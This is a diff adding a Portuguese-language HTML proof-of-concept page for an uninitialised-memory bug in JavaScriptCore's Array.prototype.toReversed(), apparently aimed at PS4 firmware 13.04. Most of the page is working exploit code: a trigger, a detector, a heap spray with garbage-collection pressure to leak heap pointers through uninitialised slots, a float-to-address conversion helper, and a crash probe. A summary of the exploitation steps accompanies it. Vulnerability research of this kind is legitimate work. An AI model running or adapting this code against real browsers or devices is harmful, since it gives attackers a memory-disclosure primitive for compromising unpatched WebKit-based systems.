@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>Bug #2: Array.toReversed() Uninitialized Memory</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#030305;color:#ddd;font-family:'Courier New',monospace;padding:16px;font-size:12px}
+h1{color:#ff2200;font-size:14px;margin-bottom:2px}
+.meta{color:#444;font-size:9px;margin-bottom:8px}
+.source-box{background:#050a05;border:2px solid #00aa44;border-radius:5px;padding:10px;margin-bottom:10px;font-size:10px;color:#44cc88;line-height:1.8;font-family:monospace}
+.source-box strong{color:#00ff66;display:block;margin-bottom:4px;font-size:11px}
+.info{background:#080810;border:1px solid #1a1a44;border-radius:5px;padding:10px;margin-bottom:12px;font-size:11px;color:#8899bb;line-height:1.6}
+#log{background:#060608;border:1px solid #1a1a2a;border-radius:5px;padding:10px;min-height:200px;white-space:pre;overflow-y:auto;max-height:420px;font-size:11px;line-height:1.6}
+.ok{color:#44ff88}.warn{color:#ffaa00}.err{color:#ff4444}.i2{color:#4488ff}.sep{color:#222}
+.btn{display:inline-block;margin-top:10px;margin-right:6px;padding:7px 14px;background:#110000;border:1px solid #441111;border-radius:4px;color:#cc4444;cursor:pointer;font-family:'Courier New',monospace;font-size:11px}
+.btn:hover{border-color:#ff2200;color:#ff4444}
+.back{display:inline-block;margin-top:10px;padding:7px 14px;background:#0d0d18;border:1px solid #222;border-radius:4px;color:#555;text-decoration:none;font-size:11px}
+</style>
+</head>
+<body>
+<h1>🔴 Bug #2 — Array.prototype.toReversed() Uninitialized Butterfly Slots</h1>
+<p class="meta">Fonte: qriousec.github.io/post/jsc-uninit · Jan/2024 · Commits 053d9a84 (bug) → 9158c52 (fix)</p>
+
+<div class="source-box">
+<strong>🔧 ANÁLISE TÉCNICA (qriousec.github.io) — Funciona 100% em LLInt sem JIT</strong>
+BUG: fastToReversed() com array de comprimento 1:<br>
+  publicLength = 1  (array.length visível)<br>
+  vectorLength = 3  (optimalContiguousVectorLength → BASE_CONTIGUOUS_VECTOR_LEN = 3)<br>
+  memcpy copia apenas 1 elemento → slots [1] e [2] ficam UNINIT (0xbadbeef0 ou lixo de heap)<br>
+<br>
+EXPLORAÇÃO EM LLINT:<br>
+  1. Spray com arrays float [addr_low, addr_high] → popula heap com ponteiros<br>
+  2. gc() → libera arrays → heap pronto para reuso<br>
+  3. [-1n].toReversed() → aloca butterfly reusando slots → v2[1] = ponteiro vazado<br>
+  4. f2i(v2[1]) → endereço de objeto JS → heap leak sem JIT!<br>
+<br>
+FIX (commit 9158c52): zera slots extras após memcpy<br>
+STATUS PS4: branch Set/2023 — verificar se commit 9158c52 está incluído
+</div>
+
+<div class="info">
+  <strong style="color:#4499ff">Por que funciona sem JIT:</strong> A vulnerabilidade está em <code>fastToReversed()</code> que é
+  C++ puro no runtime do JSC. O bug ocorre antes de qualquer compilação JIT — o array é criado
+  diretamente pela função nativa. Portanto, desativar JIT (como o PS4 faz) não tem impacto
+  na exploitabilidade. A única diferença é que sem JIT, não há aceleração de compilação para
+  a técnica de spray, mas o crash/leak ainda ocorre.
+</div>
+
+<div id="log">Aguardando...\n</div>
+<div>
+  <button class="btn" onclick="testBasic()">① Trigger Básico [-1n]</button>
+  <button class="btn" onclick="testDetect()">② Detector de Uninit</button>
+  <button class="btn" onclick="testHeapLeak()">③ Heap Spray + Leak</button>
+  <button class="btn" onclick="testVariants()">④ Variantes (length=1,2)</button>
+  <button class="btn" onclick="testBigInt()">⑤ BigInt Array Variant</button>
+  <button class="btn" onclick="runAll()">▶ Todos</button>
+</div>
+<a href="index.html" class="back">← Índice</a>
+
+<script>
+var L=document.getElementById('log');
+function l(m,c){L.innerHTML+=(c?'<span class="'+c+'">'+m+'</span>':m)+'\n';L.scrollTop=L.scrollHeight}
+function sep(t){l('─── '+(t||'')+'─────────────────────','sep')}
+function hex(n){return '0x'+n.toString(16).padStart(16,'0')}
+function f2i(f){var b=new ArrayBuffer(8);new Float64Array(b)[0]=f;var dv=new DataView(b);return dv.getUint32(4)*0x100000000+dv.getUint32(0)}
+
+// Teste 1: Trigger básico do bug
+function testBasic(){
+  sep('Trigger Básico [-1n].toReversed()');
+  l('Verificando se toReversed() existe...','i2');
+
+  if(typeof Array.prototype.toReversed==='undefined'){
+    l('Array.prototype.toReversed() NÃO EXISTE neste ambiente','warn');
+    l('→ Bug não aplicável — PS4 FW 13.04 pode não ter esta feature','warn');
+    return;
+  }
+  l('toReversed() EXISTE ✓','ok');
+
+  // PoC original do qriousec
+  try {
+    var v1 = [-1n]; // array BigInt de comprimento 1
+    var v2 = v1.toReversed();
+    l('v1 = [-1n], v2 = v1.toReversed()','i2');
+    l('v2.length = '+v2.length+' (publicLength)','i2');
+
+    // O bug: acessar índice além do publicLength (slot uninit)
+    l('Acessando v2[0] = '+v2[0]+' (inicializado)','ok');
+    l('Acessando v2[1]...','warn');
+    try {
+      var slot1 = v2[1];
+      l('v2[1] = '+(slot1===undefined?'undefined (patch aplicado)':String(slot1)+' ← UNINIT SLOT!'),
+        slot1===undefined?'ok':'err');
+      if(slot1 !== undefined){
+        l('→ Slot não-inicializado acessível! Bug CONFIRMADO','err');
+      }
+    } catch(e2){
+      l('v2[1] → CRASH: '+e2.name+' — '+e2.message,'err');
+      l('→ CRASH = bug presente (slot uninit causa acesso inválido)','err');
+    }
+
+    l('Acessando v2[2]...','warn');
+    try {
+      var slot2 = v2[2];
+      l('v2[2] = '+(slot2===undefined?'undefined (patch aplicado)':String(slot2)+' ← UNINIT SLOT!'),
+        slot2===undefined?'ok':'err');
+    } catch(e3){
+      l('v2[2] → CRASH: '+e3.name,'err');
+    }
+  } catch(e){ l('EXCEÇÃO GERAL: '+e.name+' — '+e.message,'err'); }
+}
+
+// Teste 2: Detector do comportamento
+function testDetect(){
+  sep('Detector de Comportamento Uninit');
+  l('Verificando vetores de comprimento 1,2,3...','i2');
+
+  if(typeof Array.prototype.toReversed==='undefined'){
+    l('toReversed() ausente — skip','warn'); return;
+  }
+
+  // Arrays de comprimento 1,2,3 (comprimento 3 = BASE_CONTIGUOUS_VECTOR_LEN)
+  [1,2,3].forEach(function(len){
+    try {
+      var arr = [];
+      for(var i=0;i<len;i++) arr.push(i*1.1); // float array
+      var rev = arr.toReversed();
+
+      // Verifica se existe conteúdo além do publicLength
+      var extras = [];
+      for(var j=len;j<len+3;j++){
+        var val = rev[j];
+        if(val !== undefined) extras.push('v['+j+']='+val);
+      }
+
+      if(extras.length > 0){
+        l('Array('+len+').toReversed(): UNINIT slots → '+extras.join(', '),'err');
+      } else {
+        l('Array('+len+').toReversed(): slots extras = undefined (patch OK)','ok');
+      }
+    } catch(e){ l('Array('+len+'): CRASH '+e.name,'err'); }
+  });
+}
+
+// Teste 3: Heap spray para tentar leak de ponteiro
+function testHeapLeak(){
+  sep('Heap Spray + Ponteiro Leak');
+  l('Tentando vazar ponteiro de heap via uninit slot...','warn');
+  l('(Técnica: qriousec.github.io/post/jsc-uninit)','i2');
+
+  if(typeof Array.prototype.toReversed==='undefined'){
+    l('toReversed() ausente — skip','warn'); return;
+  }
+
+  try {
+    // Spray: aloca arrays float para popular heap com ponteiros
+    var spray_arr = [];
+    for(var i=0;i<0x40;i++){
+      spray_arr[i] = [2.1*i, 2.2, 2.3]; // arrays de doubles
+    }
+
+    // GC: force collection para liberar e preparar heap para reuso
+    // (sem gc() explícito no PS4, usa pressão de memória)
+    var gcPressure = [];
+    for(var g=0;g<20;g++) gcPressure.push(new ArrayBuffer(1024*1024));
+    gcPressure = null;
+    spray_arr = null;
+
+    // Re-spray após GC
+    var spray2 = [];
+    for(var k=0;k<0x60;k++){
+      spray2[k] = [1.1*(k+1), 2.2*(k+1), 3.3];
+    }
+
+    // Trigger do bug: array de comprimento 1
+    var b1 = [1.1];
+    var b1r = b1.toReversed();
+
+    l('b1.toReversed() executado','i2');
+    var leaked = b1r[1]; // slot uninit — pode conter ponteiro do spray
+    if(leaked !== undefined && typeof leaked === 'number'){
+      var asInt = f2i(leaked);
+      l('b1r[1] = '+leaked+' → como inteiro: '+hex(asInt),'err');
+      // Verifica se parece um ponteiro de heap (range típico)
+      if(asInt > 0x7f0000000000 && asInt < 0x8000ffffffff){
+        l('→ Parece ponteiro de heap! BUG CONFIRMADO + LEAK','err');
+      } else if(asInt !== 0){
+        l('→ Valor não-zero em slot uninit → BUG CONFIRMADO','err');
+      } else {
+        l('→ Zero ou NaN (heap pode ter sido zerado — patch aplicado?)','ok');
+      }
+    } else if(leaked === undefined){
+      l('b1r[1] = undefined → patch provavelmente aplicado neste branch','ok');
+    } else {
+      l('b1r[1] = '+leaked+' (tipo: '+typeof leaked+')','warn');
+    }
+  } catch(e){ l('EXCEÇÃO: '+e.name+' — '+e.message,'err'); }
+}
+
+// Teste 4: Variantes com diferentes tipos
+function testVariants(){
+  sep('Variantes de Array Type');
+  l('Testando toReversed() em diferentes tipos de array...','i2');
+
+  if(typeof Array.prototype.toReversed==='undefined'){
+    l('toReversed() ausente','warn'); return;
+  }
+
+  var testCases = [
+    {name:'Array Float [1.1]', arr:[1.1]},
+    {name:'Array Int [42]',    arr:[42]},
+    {name:'Array Misto [1,null]', arr:[1,null]},
+    {name:'Array String ["x"]', arr:['x']},
+  ];
+
+  testCases.forEach(function(tc){
+    try {
+      var rev = tc.arr.toReversed();
+      var s1 = rev[tc.arr.length];
+      var s2 = rev[tc.arr.length+1];
+      var vuln = (s1 !== undefined || s2 !== undefined);
+      l(tc.name+' → slot['+(tc.arr.length)+']='+s1+' slot['+(tc.arr.length+1)+']='+s2
+        +(vuln?' ← UNINIT':''),vuln?'err':'ok');
+    } catch(e){ l(tc.name+' → CRASH '+e.name,'err'); }
+  });
+}
+
+// Teste 5: BigInt array (original do qriousec)
+function testBigInt(){
+  sep('BigInt Array Variant (original qriousec)');
+  l('[-1n].toReversed() com acesso a slot 2...','warn');
+
+  if(typeof Array.prototype.toReversed==='undefined'){
+    l('toReversed() ausente','warn'); return;
+  }
+
+  try {
+    var v1 = [-1n];
+    var v2 = v1.toReversed();
+
+    l('Descrição do v2: length='+v2.length,'i2');
+
+    // Tenta v2[2].toString() — qriousec: causa crash pois 0xbadbeef0 não é objeto
+    l('Tentando v2[2]...','warn');
+    try {
+      var x = v2[2];
+      if(x !== undefined){
+        l('v2[2] = '+x+' ← SLOT UNINIT ACESSÍVEL!','err');
+        // Tentar property access (causa crash se 0xbadbeef0)
+        l('Tentando v2[2].toString()...','warn');
+        try {
+          var s = v2[2].toString();
+          l('v2[2].toString() = '+s,'warn');
+        } catch(e2){
+          l('CRASH em .toString(): '+e2.name+' — '+e2.message,'err');
+          l('→ 0xbadbeef0 desreferenciado como objeto → CRASH CONFIRMADO','err');
+        }
+      } else {
+        l('v2[2] = undefined (patch aplicado ou comprimento diferente)','ok');
+      }
+    } catch(ex){
+      l('v2[2] → CRASH DIRETO: '+ex.name+' — '+ex.message,'err');
+      l('→ Bug presente! Slot uninit causou acesso inválido','err');
+    }
+  } catch(e){ l('EXCEÇÃO GERAL: '+e.name,'err'); }
+}
+
+function runAll(){
+  L.innerHTML='';
+  l('▶ TODOS OS TESTES — Bug toReversed() uninit (qriousec)','warn');
+  l('Foco: Safari 17 branch — PS4 FW 13.04 pode ser anterior ao fix 9158c52','i2');
+  setTimeout(testBasic,50);
+  setTimeout(testDetect,400);
+  setTimeout(testHeapLeak,800);
+  setTimeout(testVariants,1200);
+  setTimeout(testBigInt,1600);
+}
+</script>
+</body>
+</html>
